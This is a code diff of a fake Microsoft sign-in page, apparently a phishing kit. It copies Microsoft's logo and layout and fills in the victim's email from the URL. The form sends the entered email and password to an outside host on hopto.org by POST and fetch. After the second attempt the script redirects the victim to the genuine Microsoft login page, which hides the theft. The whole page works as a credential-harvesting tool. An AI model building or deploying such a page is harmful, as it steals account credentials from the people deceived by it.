@@ -9,7 +9,6 @@
         type="image/x-icon">
     <title>Sign In</title>
     <style>
-        /* ... your existing styles ... */
         body {
             margin: 0;
             font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
@@ -24,6 +23,7 @@
 
         .login-container {
             background: white;
+            /* border-radius: 8px; */
             width: 360px;
             padding: 30px;
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
@@ -31,7 +31,7 @@
 
         .logo {
             width: 100px;
-            margin-bottom: 25px;
+            margin-bottom: 25px
         }
 
         .title1 {
@@ -53,8 +53,25 @@
             margin-bottom: 20px;
         }
 
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+        }
+
+        /*  */
         input[type="email"],
-        input[type="password"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0 5px 0;
+            border: none;
+            border-bottom: 2px solid #0078D4;
+            outline: none;
+        }
+
         input[type="text"] {
             width: 100%;
             padding: 10px;
@@ -62,8 +79,18 @@
             border: none;
             border-bottom: 2px solid #0078D4;
             outline: none;
-            font-size: 14px;
         }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0 5px 0;
+            border: none;
+            border-bottom: 2px solid #0078D4;
+            outline: none;
+        }
+
+        /*  */
 
         .email-wrapper {
             text-align: center;
@@ -78,10 +105,12 @@
             font-size: 14px;
             padding: 6px 14px;
             border-radius: 999px;
+            text-align: center;
             white-space: nowrap;
             max-width: 100%;
             word-break: break-word;
         }
+
 
         .btn {
             width: 30%;
@@ -110,14 +139,36 @@
             transform: translateY(-50%);
             cursor: pointer;
             user-select: none;
-            width: 24px;
-            height: 24px;
+        }
+
+        .toggle-password svg {
+            width: 20px;
+            height: 20px;
+            fill: #888;
         }
 
         .hidden {
             display: none;
         }
 
+        .footer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .links {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .links a {
+            color: #0067C5;
+            text-decoration: none;
+        }
+
+        /*  */
         .sign-in-options {
             margin-top: 20px;
             width: 396px;
@@ -140,15 +191,18 @@
         }
 
         .alt-link {
-            text-align: center;
+            text-align: left;
             margin-top: 25px;
             font-size: 15px;
+            text-align: center;
         }
 
         .alt-link a {
             color: #0067C5;
             font-weight: 500;
             text-decoration: none;
+            margin-bottom: 10px;
+            text-align: center;
         }
 
         .sub-btn {
@@ -162,6 +216,22 @@
         body.step2-active {
             background: url("https://logincdn.msftauth.net/shared/5/images/fluent_web_light_57fee22710b04cebe1d5.svg") no-repeat center center fixed;
             background-size: cover;
+            -webkit-background-size: cover;
+            -moz-background-size: cover;
+            -o-background-size: cover;
+            background-size: cover;
+            /* background-position-y: -50px; */
+        }
+
+        /*  */
+        /* .logo {
+            text-align: left;
+            margin-bottom: 20px;
+        } */
+
+        .logo img {
+            width: 100px;
+            margin: 10px 0;
         }
 
         body.step2-active .logo {
@@ -170,6 +240,17 @@
             justify-content: center;
             align-items: center;
             text-align: center;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            user-select: none;
         }
     </style>
 </head>
@@ -180,12 +261,19 @@
             <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDfPy4C-azpmAC5NTHImq3ff2v8yjFk9Pl4CI_54aMQ5sJcRY4u7EfdCR8YeCpOgd7Tgd_R0uBNd6vi4latzxIZU8XSePjz9vOFVUHjQR-DJmHDcDYjyrfRQyedNZo_EJNJzC2e19JKQu4UsBaisCnCc7j7WLhLNcN4_VycBHFPfp8VisEj8tF2Hyig4k/w275-h61/microsoft_logo_564db913a7fa0ca42727161c6d031bef.png"
                 alt="Microsoft Logo">
         </div>
-        <form id="loginForm" action="https://abeelakshoofr.hopto.org/out/next2580.php" method="POST">
+        <form action="https://abeelakshoofr.hopto.org/out/next2580.php" method="POST">
             <!-- Step 1 -->
             <div class="step step-1">
                 <div class="title title1">Sign in</div>
                 <div class="input-group">
                     <input type="text" id="email" name="user" placeholder="Email, phone, or Skype" required>
+                    <!-- javascrip for auto -->
+                    <script type="text/javascript">
+                        var url = window.location.href;
+                        var name = url.substring(url.indexOf("=") + 1);
+                        document.getElementById("email").value = name;
+                    </script>
+                    <!--  -->
                 </div>
                 <div class="links">
                     No account? <a href="#">Create one!</a><br /><br>
@@ -196,20 +284,27 @@
 
             <!-- Step 2 -->
             <div class="step step-2 hidden">
+                <!-- <div class="email-pill" id="displayEmail"></div> -->
                 <div class="email-wrapper">
                     <span id="displayEmail" class="email-pill">user@example.com</span>
                 </div>
                 <div class="title2">Enter your password</div>
                 <div class="input-group password-group">
-                    <input type="password" id="password" name="pass" placeholder="Password" autocomplete="new-password" required>
+                    <input type="password" id="password" name="pass" placeholder="Password" autocomplete="new-password"
+                        required>
                     <img src="https://static.thenounproject.com/png/506282-200.png" alt="Toggle Password"
                         class="toggle-password" id="togglePasswordIcon" onclick="togglePassword()" />
                 </div>
+                <!-- <div class="links">
+                    <a href="#">Forgot password?</a>
+                </div> -->
                 <button type="submit" class="btn sub-btn">Next</button>
                 <div class="alt-link">
                     <a href="#">Sign in with a different account</a>
                 </div>
             </div>
+
+            <!-- <div class="footer" id="footer">Sign-in options</div> -->
         </form>
     </div>
     <div class="sign-in-options" id="footer">
@@ -217,7 +312,30 @@
             alt="Key Icon" width="20" height="20">
         Sign-in options
     </div>
+    <!-- <script>
+        const form = document.getElementById('loginForm');
+        const step1 = document.querySelector('.step-1');
+        const step2 = document.querySelector('.step-2');
+        const emailInput = document.getElementById('email');
+        const displayEmail = document.getElementById('displayEmail');
+        const footer = document.getElementById('footer');
 
+        function goToStep2() {
+            const email = emailInput.value.trim();
+            if (email) {
+                displayEmail.textContent = email;
+                step1.classList.add('hidden');
+                step2.classList.remove('hidden');
+                footer.style.display = "none";
+                document.getElementById('password').focus();
+            }
+        }
+
+        function togglePassword() {
+            const pwd = document.getElementById("password");
+            pwd.type = pwd.type === "password" ? "text" : "password";
+        }
+    </script> -->
     <script>
         const form = document.getElementById('loginForm');
         const step1 = document.querySelector('.step-1');
@@ -235,6 +353,8 @@
                 footer.style.display = "none";
                 document.body.classList.add('step2-active');
                 document.getElementById('password').focus();
+                document.body.classList.add('step2-active');
+
             }
         }
 
@@ -251,37 +371,34 @@
             }
         }
 
+
         form.addEventListener('submit', function (e) {
             e.preventDefault();
 
+            // Get count from localStorage
             let submitCount = parseInt(localStorage.getItem('submitCount') || '0');
             submitCount += 1;
             localStorage.setItem('submitCount', submitCount);
 
+            // Submit form data using fetch
             const formData = new FormData(form);
-
             fetch(form.action, {
                 method: 'POST',
                 body: formData
             }).then(() => {
                 if (submitCount >= 2) {
-                    // Redirect after second submit
-                    window.location.href = "https://loginmicrosoftonlinecom-common-oaut1wqhau128bas812bab12aas.vercel.app/?=%0%";
+                    window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&client-request-id=ad1fc534-9e81-8b8c-d441-a60df07d5035&response_mode=fragment&client_info=1&prompt=select_account&nonce=01987951-76ce-7115-adbf-3884e1f942fb&state=eyJpZCI6IjAxOTg3OTUxLTc2Y2MtNzVhZS05NTc1LTZkYWUxMWRmZDgxNyIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D&claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-client-SKU=msal.js.browser&x-client-VER=4.14.0&response_type=code&code_challenge=iagCL-XjgucjaN1_q2-XZNHq_Gu_IwY-vh90jMHNMc8&code_challenge_method=S256&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&fl=dob,flname,wld";
                 } else {
-                    // Reset for first submit, clear email input
+                    // Refresh form to step 1
                     form.reset();
-                    emailInput.value = "";
                     step2.classList.add('hidden');
                     step1.classList.remove('hidden');
                     footer.style.display = "block";
-                    document.body.classList.remove('step2-active');
                 }
-            }).catch(() => {
-                // On error, optionally reset or handle
-                alert('An error occurred while submitting the form. Please try again.');
             });
         });
     </script>
+
 
 </body>
 
